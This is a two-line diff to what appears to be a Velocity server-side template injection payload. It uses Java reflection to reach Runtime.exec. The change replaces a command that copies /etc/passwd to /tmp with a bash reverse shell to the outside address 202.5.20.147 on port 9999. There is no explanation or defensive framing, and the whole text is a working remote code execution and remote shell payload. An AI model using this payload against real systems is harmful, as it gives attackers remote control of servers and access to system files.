@@ -1,2 +1,2 @@
 #set($e="e")
-$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("cp /etc/passwd /tmp")
+$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("bash -i >& /dev/tcp/202.5.20.147/9999 0>&1")
